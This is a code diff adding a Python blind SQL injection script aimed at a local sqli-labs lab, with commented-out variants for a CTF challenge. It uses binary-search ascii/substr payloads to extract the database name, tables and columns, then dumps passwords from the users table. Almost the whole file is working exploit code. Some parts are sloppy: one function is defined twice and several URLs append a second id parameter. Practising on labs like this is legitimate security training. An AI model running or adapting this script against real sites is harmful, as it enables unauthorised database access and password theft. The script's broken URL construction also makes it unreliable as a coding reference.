@@ -1,0 +1,215 @@
+# -*-coding:utf-8-*-
+import requests
+import time
+
+# host = "http://web.jarvisoj.com:32787/login.php"
+host = "http://127.0.0.1/sqlilabs/Less-5/?id=1"
+
+def getDatabase():  #获取数据库名
+    global host
+    ans=''
+    for i in range(1,1000):
+        low = 32
+        high = 128
+        mid = (low+high)//2
+        while low < high:
+            payload= "1'^(ascii(substr((select(database())),%d,1))<%d)^1#" % (i,mid)
+            param ={"username":payload,"password":"admin"}
+            res = requests.post(host,data=param)
+            if "用户名错误" in res.text:
+                high = mid
+            else:
+                low = mid+1
+            mid=(low+high)//2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid-1)
+        print("database is -> "+ans)
+
+
+def getDatabase():  # 获取数据库名
+    global host
+    ans = ''
+    for i in range(1, 1000):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while low < high:
+            url = host + "?id=1'^(ascii(substr((select(database())),%d,1))<%d)^1-- -" % (i, mid)
+            res = requests.get(url)
+            if "You are in" in res.text:
+                high = mid
+            else:
+                low = mid + 1
+            mid = (low + high) // 2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid - 1)
+        print("database is -> " + ans)
+
+
+'''
+def getTable(): #获取表名
+    global host
+    ans=''
+    for i in range(1,1000):
+        low = 32
+        high = 128
+        mid = (low+high)//2
+        while low < high:
+            url = host + "id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),%d,1))<%d)^1" % (i,mid)
+            res = requests.get(url)
+            if "others~~~" in res.text:
+                high = mid
+            else:
+                low = mid+1
+            mid=(low+high)//2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid-1)
+        print("table is -> "+ans)
+'''
+
+
+def getTable():  # 获取表名
+    global host
+    ans = ''
+    for i in range(1, 1000):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while low < high:
+            url = host + "?id=1'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))<%d)^1-- -" % (
+            i, mid)
+            res = requests.get(url)
+            if "You are in" in res.text:
+                high = mid
+            else:
+                low = mid + 1
+            mid = (low + high) // 2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid - 1)
+        print("table is -> " + ans)
+
+
+'''
+def getColumn(): #获取列名
+    global host
+    ans=''
+    for i in range(1,1000):
+        low = 32
+        high = 128
+        mid = (low+high)//2
+        while low < high:
+            url = host + "id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='Flaaaaag')),%d,1))<%d)^1" % (i,mid)
+            res = requests.get(url)
+            if "others~~~" in res.text:
+                high = mid
+            else:
+                low = mid+1
+            mid=(low+high)//2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid-1)
+        print("column is -> "+ans)
+'''
+
+
+def getColumn():  # 获取列名
+    global host
+    ans = ''
+    for i in range(1, 1000):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while low < high:
+            # url = host + "id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),%d,1))<%d)^1" % (i,mid)
+            #   res = requests.get(url)
+            url = host + "id=1'^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='users')),%d,1))<%d)^1-- -" % (
+            i, mid)
+            res = requests.get(url)
+
+            if "You are in" in res.text:
+                high = mid
+            else:
+                low = mid + 1
+            mid = (low + high) // 2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid - 1)
+        print("column is -> " + ans)
+
+
+'''
+def dumpTable():#脱裤
+    global host
+    ans=''
+    for i in range(1,10000):
+        low = 32
+        high = 128
+        mid = (low+high)//2
+        while low < high:
+            url = host + "id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))<%d)^1" % (i,mid)
+            res = requests.get(url)
+            if "others~~~" in res.text:
+                high = mid
+            else:
+                low = mid+1
+            mid=(low+high)//2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid-1)
+        print("dumpTable is -> "+ans)
+'''
+'''
+def dumpTable():#脱裤
+    global host
+    ans=''
+    for i in range(1,10000):
+        low = 32
+        high = 128
+        mid = (low+high)//2
+        while low < high:
+            url = host + "id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))<%d)^1" % (i,mid)
+            res = requests.get(url)
+            if "others~~~" in res.text:
+                high = mid
+            else:
+                low = mid+1
+            mid=(low+high)//2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid-1)
+        print("dumpTable is -> "+ans)
+'''
+
+
+def dumpTable():  # 脱裤
+    global host
+    ans = ''
+    for i in range(1, 10000):
+        low = 32
+        high = 128
+        mid = (low + high) // 2
+        while low < high:
+            #   url = host + "id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))<%d)^1" % (i,mid)
+            #  res = requests.get(url)
+            url = host + "id=1'^(ascii(substr((select(group_concat(password))from(users)),%d,1))<%d)^1-- -" % (i, mid)
+            res = requests.get(url)
+            if "You are in" in res.text:
+                high = mid
+            else:
+                low = mid + 1
+            mid = (low + high) // 2
+        if mid <= 32 or mid >= 127:
+            break
+        ans += chr(mid - 1)
+        print("dumpTable is -> " + ans)
+
+
+getDatabase()
+getTable()
+getColumn()
+dumpTable()
+
